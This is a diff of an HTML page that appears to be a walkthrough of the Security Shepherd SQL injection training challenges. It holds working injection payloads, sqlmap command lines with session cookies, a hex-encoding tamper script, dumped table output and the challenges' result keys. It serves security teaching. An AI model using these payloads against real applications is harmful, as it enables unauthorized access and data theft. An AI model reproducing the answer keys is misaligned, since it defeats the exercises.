@@ -235,7 +235,7 @@
 <div class="section" id="sql-injection-techniques">
 <h2>3.15.5.1. SQL Injection Techniques<a class="headerlink" href="#sql-injection-techniques" title="Permalink to this headline">¶</a></h2>
 <p>SQL injection occurs when data the user influences is used in a SQL query. Here’s a classic Java example:</p>
-<div class="highlight-java"><div class="highlight"><pre><span></span><span class="n">ResultSet</span> <span class="n">resultSet</span> <span class="o">=</span> <span class="n">stmt</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">(</span>
+<div class="highlight-java notranslate"><div class="highlight"><pre><span></span><span class="n">ResultSet</span> <span class="n">resultSet</span> <span class="o">=</span> <span class="n">stmt</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">(</span>
   <span class="s">&quot;SELECT userName FROM users WHERE userName = &#39;&quot;</span> <span class="o">+</span>
 <span class="hll">  <span class="n">theUserName</span> <span class="o">+</span>
 </span>  <span class="s">&quot;&#39; AND userPassword = &#39;&quot;</span> <span class="o">+</span>
@@ -247,7 +247,7 @@
 <p>Here both “theUserName” and “thePassword” are directly input from the user. Usually either a single or double quote is used around the user input: in this case it’s a single quote. Here, you have two choices for the first user input:</p>
 <ul>
 <li><p class="first">Enter a single quote, terminating the data value and allowing SQL query input. The SQL query can include a character that will treat the rest of the string after the injected SQL code as a comment. For example:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">theUsername = &quot;&#39; OR 1=1 #&quot;</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">theUsername = &quot;&#39; OR 1=1 #&quot;</span>
 <span class="go">thePassword = &quot;anything&quot;</span>
 
 <span class="go">SELECT userName FROM users WHERE userName = &#39;?&#39; AND userPassword = &#39;?&#39;</span>
@@ -257,8 +257,8 @@
 </div>
 <p>Here, every userName is returned from the table.</p>
 </li>
-<li><p class="first">Enter a backslash (<code class="docutils literal"><span class="pre">\</span></code>), making the trailing single quote actually part of the data, along with the rest of the query until another single quote is encountered. Here, that would be up to where “thePassword” is injected, so “thePassword” could be SQL code without a leading single quote.</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">theUsername = &quot;\&quot;</span>
+<li><p class="first">Enter a backslash (<code class="docutils literal notranslate"><span class="pre">\</span></code>), making the trailing single quote actually part of the data, along with the rest of the query until another single quote is encountered. Here, that would be up to where “thePassword” is injected, so “thePassword” could be SQL code without a leading single quote.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">theUsername = &quot;\&quot;</span>
 <span class="go">thePassword = &quot; UNION SELECT somecol FROM sometable WHERE condition #&quot;</span>
 
 <span class="go">SELECT userName FROM users WHERE userName = &#39;?&#39; AND userPassword = &#39;?&#39;</span>
@@ -270,22 +270,22 @@
 </li>
 </ul>
 <p>There can be injection even where prepared statements are used.</p>
-<div class="highlight-java"><div class="highlight"><pre><span></span><span class="n">PreparedStatement</span> <span class="n">callstmnt</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span>
+<div class="highlight-java notranslate"><div class="highlight"><pre><span></span><span class="n">PreparedStatement</span> <span class="n">callstmnt</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span>
     <span class="s">&quot;SELECT aColumn FROM aTable WHERE aColumn LIKE ?&quot;</span><span class="o">);</span>
 <span class="n">callstmnt</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">userId</span><span class="o">);</span>
 </pre></div>
 </div>
-<p>In this case you can enter wildcard characters (in MySQL, <code class="docutils literal"><span class="pre">%</span></code> or <code class="docutils literal"><span class="pre">_</span></code>) to change the row or rows matched.</p>
+<p>In this case you can enter wildcard characters (in MySQL, <code class="docutils literal notranslate"><span class="pre">%</span></code> or <code class="docutils literal notranslate"><span class="pre">_</span></code>) to change the row or rows matched.</p>
 </div>
 <div class="section" id="sql-injection-1">
 <h2>3.15.5.2. SQL Injection 1<a class="headerlink" href="#sql-injection-1" title="Permalink to this headline">¶</a></h2>
 <p>The input to button <span class="guilabel">Get user</span> must look something like an email and return all rows in the table. The SQL query probably looks something like:</p>
-<div class="highlight-mysql"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">aTable</span> <span class="k">WHERE</span> <span class="n">theEmail</span> <span class="o">=</span> <span class="s1">&#39;?&#39;</span>
+<div class="highlight-mysql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">aTable</span> <span class="k">WHERE</span> <span class="n">theEmail</span> <span class="o">=</span> <span class="s1">&#39;?&#39;</span>
 </pre></div>
 </div>
-<p>This is the shortest input we’ve found that works: <code class="docutils literal"><span class="pre">'+0#&#64;x</span></code></p>
-<p>The trailing <code class="docutils literal"><span class="pre">&#64;x</span></code> is needed to make it look like an email, the <code class="docutils literal"><span class="pre">#</span></code> to comment out the trailing <code class="docutils literal"><span class="pre">&#64;x</span></code>, the leading <code class="docutils literal"><span class="pre">'</span></code> to terminate the email string input, and the <code class="docutils literal"><span class="pre">+0</span></code> does the magic of making every row true. Adding or comparing a string to an integer causes the string to be coerced to a floating point value; that value will be 0 when the string does not represent an valid floating point value. So eventually we compare:</p>
-<div class="highlight-mysql"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">aTable</span> <span class="k">WHERE</span> <span class="n">theEmail</span> <span class="o">=</span> <span class="s1">&#39;?&#39;</span>
+<p>This is the shortest input we’ve found that works: <code class="docutils literal notranslate"><span class="pre">'+0#&#64;x</span></code></p>
+<p>The trailing <code class="docutils literal notranslate"><span class="pre">&#64;x</span></code> is needed to make it look like an email, the <code class="docutils literal notranslate"><span class="pre">#</span></code> to comment out the trailing <code class="docutils literal notranslate"><span class="pre">&#64;x</span></code>, the leading <code class="docutils literal notranslate"><span class="pre">'</span></code> to terminate the email string input, and the <code class="docutils literal notranslate"><span class="pre">+0</span></code> does the magic of making every row true. Adding or comparing a string to an integer causes the string to be coerced to a floating point value; that value will be 0 when the string does not represent an valid floating point value. So eventually we compare:</p>
+<div class="highlight-mysql notranslate"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">aTable</span> <span class="k">WHERE</span> <span class="n">theEmail</span> <span class="o">=</span> <span class="s1">&#39;?&#39;</span>
 <span class="o">=</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">aTable</span> <span class="k">WHERE</span> <span class="n">theEmail</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">+</span><span class="mi">0</span><span class="c1">#@x&#39;</span>
 <span class="o">=</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">aTable</span> <span class="k">WHERE</span> <span class="n">theEmail</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">+</span><span class="mi">0</span>
 <span class="o">=</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">aTable</span> <span class="k">WHERE</span> <span class="n">theEmail</span> <span class="o">=</span> <span class="mi">0</span><span class="o">+</span><span class="mi">0</span>
@@ -293,46 +293,46 @@
 <span class="o">=</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">aTable</span> <span class="k">WHERE</span> <span class="mi">0</span> <span class="o">=</span> <span class="mi">0</span>
 </pre></div>
 </div>
-<p>Another short string that works is <code class="docutils literal"><span class="pre">'||1#&#64;x</span></code>.</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">The Result key is</span>
+<p>Another short string that works is <code class="docutils literal notranslate"><span class="pre">'||1#&#64;x</span></code>.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="go">The Result key is</span>
 </span><span class="hll"><span class="go">f62abebf5658a6a44c5c9babc7865110c62f5ecd9d0a7052db48c4dbee0200e3</span>
 </span></pre></div>
 </div>
 </div>
 <div class="section" id="sql-injection-2">
 <h2>3.15.5.3. SQL Injection 2<a class="headerlink" href="#sql-injection-2" title="Permalink to this headline">¶</a></h2>
-<p>This is very similar to SQL Injection1 and a variant of the second answer above works: <code class="docutils literal"><span class="pre">'||1#</span></code></p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">The reuslt Key is</span>
+<p>This is very similar to SQL Injection1 and a variant of the second answer above works: <code class="docutils literal notranslate"><span class="pre">'||1#</span></code></p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="go">The reuslt Key is</span>
 </span><span class="hll"><span class="go">fd8e9a29dab791197115b58061b215594211e72c1680f1eacc50b0394133a09f</span>
 </span></pre></div>
 </div>
 </div>
 <div class="section" id="sql-injection-3">
 <h2>3.15.5.4. SQL Injection 3<a class="headerlink" href="#sql-injection-3" title="Permalink to this headline">¶</a></h2>
-<p>Since a variant of <code class="docutils literal"><span class="pre">'||1#</span></code> worked on the previous injections, trying it again lists all the user names. All we have to do is add a UNION query to return the credit card numbers:</p>
-<div class="highlight-mysql"><div class="highlight"><pre><span></span><span class="k">UNION</span> <span class="k">SELECT</span> <span class="n">creditCardColumn</span> <span class="k">FROM</span> <span class="n">customerTable</span> <span class="k">WHERE</span> <span class="n">nameColumn</span> <span class="o">=</span> <span class="s1">&#39;Mary Martin&#39;</span>
+<p>Since a variant of <code class="docutils literal notranslate"><span class="pre">'||1#</span></code> worked on the previous injections, trying it again lists all the user names. All we have to do is add a UNION query to return the credit card numbers:</p>
+<div class="highlight-mysql notranslate"><div class="highlight"><pre><span></span><span class="k">UNION</span> <span class="k">SELECT</span> <span class="n">creditCardColumn</span> <span class="k">FROM</span> <span class="n">customerTable</span> <span class="k">WHERE</span> <span class="n">nameColumn</span> <span class="o">=</span> <span class="s1">&#39;Mary Martin&#39;</span>
 </pre></div>
 </div>
 <p>So we have to determine the customer table name and the column names for the credit card and name. Let’s use the SQL injection to recon the database:</p>
 <ul class="simple">
-<li><code class="docutils literal"><span class="pre">'</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">VERSION()</span> <span class="pre">#</span></code> returns <strong>5.5.43-0ubuntu0.14.04.1</strong></li>
-<li><code class="docutils literal"><span class="pre">'</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">DATABASE()</span> <span class="pre">#</span></code> returns <strong>SqlChalThree</strong></li>
-<li><code class="docutils literal"><span class="pre">'</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">table_name</span> <span class="pre">from</span> <span class="pre">information_schema.tables</span> <span class="pre">where</span> <span class="pre">table_schema='SqlChalThree'</span> <span class="pre">#</span></code> returns <strong>SELECT command denied to user ‘HdmiNoSignal’&#64;’localhost’ for table ‘tables’</strong></li>
+<li><code class="docutils literal notranslate"><span class="pre">'</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">VERSION()</span> <span class="pre">#</span></code> returns <strong>5.5.43-0ubuntu0.14.04.1</strong></li>
+<li><code class="docutils literal notranslate"><span class="pre">'</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">DATABASE()</span> <span class="pre">#</span></code> returns <strong>SqlChalThree</strong></li>
+<li><code class="docutils literal notranslate"><span class="pre">'</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">table_name</span> <span class="pre">from</span> <span class="pre">information_schema.tables</span> <span class="pre">where</span> <span class="pre">table_schema='SqlChalThree'</span> <span class="pre">#</span></code> returns <strong>SELECT command denied to user ‘HdmiNoSignal’&#64;’localhost’ for table ‘tables’</strong></li>
 </ul>
-<p>So we’re denied doing database recon and must resort to guessing. Fortunately we get a visible error. After a few tries we know <code class="docutils literal"><span class="pre">OR</span></code> is filtered out so we use <code class="docutils literal"><span class="pre">||</span></code> instead and make lots of tries to get the nameColumn. Eventually we see <code class="docutils literal"><span class="pre">'</span> <span class="pre">||</span> <span class="pre">customername</span> <span class="pre">=</span> <span class="pre">'Mary</span> <span class="pre">Martin'</span> <span class="pre">#</span></code> works. Next we need to guess the creditCardColumn. Eventually we see <code class="docutils literal"><span class="pre">'</span> <span class="pre">||</span> <span class="pre">creditcardnumber</span> <span class="pre">=</span> <span class="pre">'0'</span> <span class="pre">#</span></code> works. Finally we need the table. Eventually we see <code class="docutils literal"><span class="pre">'</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">creditcardnumber</span> <span class="pre">FROM</span> <span class="pre">customers</span> <span class="pre">WHERE</span> <span class="pre">customername</span> <span class="pre">=</span> <span class="pre">'Mary</span> <span class="pre">Martin'</span> <span class="pre">#</span></code> works and we get the credit card number:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">9815 1547 3214 7569</span>
+<p>So we’re denied doing database recon and must resort to guessing. Fortunately we get a visible error. After a few tries we know <code class="docutils literal notranslate"><span class="pre">OR</span></code> is filtered out so we use <code class="docutils literal notranslate"><span class="pre">||</span></code> instead and make lots of tries to get the nameColumn. Eventually we see <code class="docutils literal notranslate"><span class="pre">'</span> <span class="pre">||</span> <span class="pre">customername</span> <span class="pre">=</span> <span class="pre">'Mary</span> <span class="pre">Martin'</span> <span class="pre">#</span></code> works. Next we need to guess the creditCardColumn. Eventually we see <code class="docutils literal notranslate"><span class="pre">'</span> <span class="pre">||</span> <span class="pre">creditcardnumber</span> <span class="pre">=</span> <span class="pre">'0'</span> <span class="pre">#</span></code> works. Finally we need the table. Eventually we see <code class="docutils literal notranslate"><span class="pre">'</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">creditcardnumber</span> <span class="pre">FROM</span> <span class="pre">customers</span> <span class="pre">WHERE</span> <span class="pre">customername</span> <span class="pre">=</span> <span class="pre">'Mary</span> <span class="pre">Martin'</span> <span class="pre">#</span></code> works and we get the credit card number:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="go">9815 1547 3214 7569</span>
 </span></pre></div>
 </div>
 </div>
 <div class="section" id="sql-injection-4">
 <h2>3.15.5.5. SQL Injection 4<a class="headerlink" href="#sql-injection-4" title="Permalink to this headline">¶</a></h2>
-<p>Generally you disrupt the SQL query by placing single (<code class="docutils literal"><span class="pre">'</span></code>) or double (<code class="docutils literal"><span class="pre">&quot;</span></code>) quotes in the inputs, or if those are filtered placing a backslash as input to consume the trailing single or double quote. After playing around with single and double quotes we suspect they are being filtered. So we try these values:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">UserName = \</span>
+<p>Generally you disrupt the SQL query by placing single (<code class="docutils literal notranslate"><span class="pre">'</span></code>) or double (<code class="docutils literal notranslate"><span class="pre">&quot;</span></code>) quotes in the inputs, or if those are filtered placing a backslash as input to consume the trailing single or double quote. After playing around with single and double quotes we suspect they are being filtered. So we try these values:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">UserName = \</span>
 <span class="go">Password = ||1#</span>
 </pre></div>
 </div>
-<p>That works to get us signed in as “adam”, who is not an admin. Now we have to make sure the person selected is an admin. To avoid having to know the table, column, and user names we’ll just select users one-by-one by starting with <span class="guilabel">Password</span> set to <code class="docutils literal"><span class="pre">||1</span> <span class="pre">LIMIT</span> <span class="pre">1</span> <span class="pre">OFFSET</span> <span class="pre">1#</span></code>, increasing the offset by 1 until we get success. The “admin” account was at offset 1:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">Signed in as admin</span>
+<p>That works to get us signed in as “adam”, who is not an admin. Now we have to make sure the person selected is an admin. To avoid having to know the table, column, and user names we’ll just select users one-by-one by starting with <span class="guilabel">Password</span> set to <code class="docutils literal notranslate"><span class="pre">||1</span> <span class="pre">LIMIT</span> <span class="pre">1</span> <span class="pre">OFFSET</span> <span class="pre">1#</span></code>, increasing the offset by 1 until we get success. The “admin” account was at offset 1:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="go">Signed in as admin</span>
 </span>
 <span class="hll"><span class="go">As you are the admin, here is the result key:</span>
 </span><span class="hll"><span class="go">d316e80045d50bdf8ed49d48f130b4acf4a878c82faef34daff8eb1b98763b6f</span>
@@ -342,11 +342,11 @@
 <div class="section" id="sql-injection-5">
 <h2>3.15.5.6. SQL Injection 5<a class="headerlink" href="#sql-injection-5" title="Permalink to this headline">¶</a></h2>
 <p>Viewing the page source using Firebug reveals JavaScript with VipCouponCheck POST URL</p>
-<div class="highlight-html"><div class="highlight"><pre><span></span>/challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck
+<div class="highlight-html notranslate"><div class="highlight"><pre><span></span>/challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck
 </pre></div>
 </div>
 <p>with parameter “couponCode”. Here’s the relevant JavaScript:</p>
-<div class="highlight-javascript"><div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nx">_0xffee</span> <span class="o">=</span> <span class="p">[</span> <span class="s2">&quot;change&quot;</span><span class="p">,</span> <span class="s2">&quot;val&quot;</span><span class="p">,</span> <span class="s2">&quot;#couponCode&quot;</span><span class="p">,</span> <span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="s2">&quot;8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62CouponCheck&quot;</span><span class="p">,</span> <span class="s2">&quot;ajax&quot;</span><span class="p">,</span> <span class="s2">&quot;8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck&quot;</span><span class="p">,</span> <span class="s2">&quot;#vipCouponCode&quot;</span> <span class="p">];</span>
+<div class="highlight-javascript notranslate"><div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nx">_0xffee</span> <span class="o">=</span> <span class="p">[</span> <span class="s2">&quot;change&quot;</span><span class="p">,</span> <span class="s2">&quot;val&quot;</span><span class="p">,</span> <span class="s2">&quot;#couponCode&quot;</span><span class="p">,</span> <span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="s2">&quot;8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62CouponCheck&quot;</span><span class="p">,</span> <span class="s2">&quot;ajax&quot;</span><span class="p">,</span> <span class="s2">&quot;8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck&quot;</span><span class="p">,</span> <span class="s2">&quot;#vipCouponCode&quot;</span> <span class="p">];</span>
 
 <span class="nx">$</span><span class="p">(</span><span class="nx">_0xffee</span><span class="p">[</span><span class="mi">2</span><span class="p">])[</span><span class="nx">_0xffee</span><span class="p">[</span><span class="mi">0</span><span class="p">]](</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
     <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="nx">_0xffee</span><span class="p">[</span><span class="mi">2</span><span class="p">])[</span><span class="nx">_0xffee</span><span class="p">[</span><span class="mi">1</span><span class="p">]]();</span>
@@ -374,7 +374,7 @@
 </pre></div>
 </div>
 <p>Let’s look for SQL injection there:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Tamper Data gives COOKIE, Firebug gives the URL and POSTDATA.</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Tamper Data gives COOKIE, Firebug gives the URL and POSTDATA.</span>
 <span class="nv">COOKIE</span><span class="o">=</span><span class="s1">&#39;currentPerson=YUd1ZXN0; JSESSIONID=DC81FF84682F17ED9600659BCA00C3AF; token=159087069452397663042571439753374898368; JSESSIONID3=&quot;XHAMNIXS+EtfXshD4Kgjvw==&quot;&#39;</span>
 <span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;https://securityshepherd.com/challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck&#39;</span>
 <span class="nv">POSTDATA</span><span class="o">=</span><span class="s1">&#39;couponCode=*&#39;</span>
@@ -391,7 +391,7 @@ sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span 
 </pre></div>
 </div>
 <p>Running this gives:</p>
-<div class="highlight-text"><div class="highlight"><pre><span></span>[09:24:48] [INFO] (custom) POST parameter &#39;#1*&#39; is &#39;Generic UNION query (NULL) - 1 to 20 columns&#39; injectable
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>[09:24:48] [INFO] (custom) POST parameter &#39;#1*&#39; is &#39;Generic UNION query (NULL) - 1 to 20 columns&#39; injectable
 (custom) POST parameter &#39;#1*&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
 sqlmap identified the following injection point(s) with a total of 45 HTTP(s) requests:
 ---
@@ -417,7 +417,7 @@ available databases [2]:
 </span></pre></div>
 </div>
 <p>Let’s find the tables in database SQLiC5Shop:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span class="se">\</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span class="se">\</span>
     --headers<span class="o">=</span><span class="s1">&#39;X-Requested-With: XMLHttpRequest&#39;</span> <span class="se">\</span>
     --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
     --data<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$POSTDATA</span><span class="s2">&quot;</span> <span class="se">\</span>
@@ -427,7 +427,7 @@ available databases [2]:
 </pre></div>
 </div>
 <p>Running this gives:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">Database: SQLiC5Shop</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Database: SQLiC5Shop</span>
 <span class="go">[2 tables]</span>
 <span class="go">+------------+</span>
 <span class="go">| items      |</span>
@@ -436,7 +436,7 @@ available databases [2]:
 </pre></div>
 </div>
 <p>Let’s dump the table vipCoupons:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span class="se">\</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span class="se">\</span>
     --headers<span class="o">=</span><span class="s1">&#39;X-Requested-With: XMLHttpRequest&#39;</span> <span class="se">\</span>
     --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
     --data<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$POSTDATA</span><span class="s2">&quot;</span> <span class="se">\</span>
@@ -446,7 +446,7 @@ available databases [2]:
 </pre></div>
 </div>
 <p>Running this gives:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">Database: SQLiC5Shop</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Database: SQLiC5Shop</span>
 <span class="go">Table: vipCoupons</span>
 <span class="go">[1 entry]</span>
 <span class="go">+--------+-------------+------------+---------------------------------------------+</span>
@@ -457,7 +457,7 @@ available databases [2]:
 </pre></div>
 </div>
 <p>This gives the coupon ‘spcil&amp;#x2f;&amp;#x7c;Pse3cr3etCouponStu.f4rU176’ which unencoded is ‘spcil/|Pse3cr3etCouponStu.f4rU176’. If we change the $3000 troll to quantity 1 and enter the VIP coupon code, clicking <span class="guilabel">Place Order</span> gives:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="go">Your order comes to a total of $0</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="go">Your order comes to a total of $0</span>
 </span>
 <span class="hll"><span class="go">Trolls were free, Well Done -</span>
 </span><span class="hll"><span class="go">343f2e424d5d7a2eff7f9ee5a5a72fd97d5a19ef7bff3ef2953e033ea32dd7ee</span>
@@ -467,8 +467,8 @@ available databases [2]:
 <div class="section" id="sql-injection-6">
 <h2>3.15.5.7. SQL Injection 6<a class="headerlink" href="#sql-injection-6" title="Permalink to this headline">¶</a></h2>
 <p>First of all the web page pin entry is capped at 4 characters, so either Tamper Data, <strong class="program">curl</strong>, or something similar is needed to try SQL injection. After trying numerous blind SQL queries you either resort to the cheat or realize that you have to \x-encode the input.</p>
-<p>To \x-encode the input for <strong class="program">sqlmap</strong> a python program <strong class="program">hexencode.py</strong> must be created. The following script creates a subdirectory <code class="file docutils literal"><span class="pre">tamper</span></code> with <strong class="program">hexencode.py</strong> and the required <code class="file docutils literal"><span class="pre">__init__.py</span></code>:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll">mkdir -p tamper
+<p>To \x-encode the input for <strong class="program">sqlmap</strong> a python program <strong class="program">hexencode.py</strong> must be created. The following script creates a subdirectory <code class="file docutils literal notranslate"><span class="pre">tamper</span></code> with <strong class="program">hexencode.py</strong> and the required <code class="file docutils literal notranslate"><span class="pre">__init__.py</span></code>:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll">mkdir -p tamper
 </span><span class="hll"><span class="nb">cd</span> tamper
 </span>
 <span class="hll">cat &gt; __init__.py <span class="s">&lt;&lt;EOF</span>
@@ -532,7 +532,7 @@ available databases [2]:
 </span></pre></div>
 </div>
 <p>Now let’s try for a SQL injection with the help of <strong class="program">hexencode.py</strong>:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Tamper Data gives COOKIE, URL, and POSTDATA.</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Tamper Data gives COOKIE, URL, and POSTDATA.</span>
 <span class="nv">COOKIE</span><span class="o">=</span><span class="s1">&#39;currentPerson=YUd1ZXN0; JSESSIONID=DC81FF84682F17ED9600659BCA00C3AF; token=159087069452397663042571439753374898368; JSESSIONID3=&quot;XHAMNIXS+EtfXshD4Kgjvw==&quot;&#39;</span>
 <span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;https://securityshepherd.com/challenges/d0e12e91dafdba4825b261ad5221aae15d28c36c7981222eb59f7fc8d8f212a2&#39;</span>
 <span class="nv">POSTDATA</span><span class="o">=</span><span class="s1">&#39;pinNumber=*&#39;</span>
@@ -550,7 +550,7 @@ sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span 
 </pre></div>
 </div>
 <p>Running this gives:</p>
-<div class="highlight-text"><div class="highlight"><pre><span></span>sqlmap identified the following injection point(s) with a total of 45 HTTP(s) requests:
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>sqlmap identified the following injection point(s) with a total of 45 HTTP(s) requests:
 ---
 Parameter: #1* ((custom) POST)
     Type: AND/OR time-based blind
@@ -578,7 +578,7 @@ available databases [2]:
 </pre></div>
 </div>
 <p>Next determine tables in database SqlChalSix:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span class="se">\</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span class="se">\</span>
     --headers<span class="o">=</span><span class="s1">&#39;X-Requested-With: XMLHttpRequest&#39;</span> <span class="se">\</span>
     --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
     --data<span class="o">=</span><span class="s2">&quot;pinNumber=*&quot;</span> <span class="se">\</span>
@@ -589,7 +589,7 @@ available databases [2]:
 </pre></div>
 </div>
 <p>Running this gives:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">Database: SqlChalSix</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Database: SqlChalSix</span>
 <span class="go">[1 table]</span>
 <span class="go">+-------+</span>
 <span class="hll"><span class="go">| users |</span>
@@ -597,7 +597,7 @@ available databases [2]:
 </pre></div>
 </div>
 <p>Next dump table users in database SqlChalSix:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span class="se">\</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sqlmap  --batch --random-agent --output-dir<span class="o">=</span>sqlmap <span class="se">\</span>
     --headers<span class="o">=</span><span class="s1">&#39;X-Requested-With: XMLHttpRequest&#39;</span> <span class="se">\</span>
     --cookie<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$COOKIE</span><span class="s2">&quot;</span> <span class="se">\</span>
     --data<span class="o">=</span><span class="s2">&quot;pinNumber=*&quot;</span> <span class="se">\</span>
@@ -608,7 +608,7 @@ available databases [2]:
 </pre></div>
 </div>
 <p>Running this gives:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">Database: SqlChalSix</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Database: SqlChalSix</span>
 <span class="go">Table: users</span>
 <span class="go">[7 entries]</span>
 <span class="go">+---------+---------+---------+----------+------------------------------------------------------------------+-----------------------------------------------+</span>
@@ -628,10 +628,10 @@ available databases [2]:
 </div>
 <div class="section" id="sql-injection-7">
 <h2>3.15.5.8. SQL Injection 7<a class="headerlink" href="#sql-injection-7" title="Permalink to this headline">¶</a></h2>
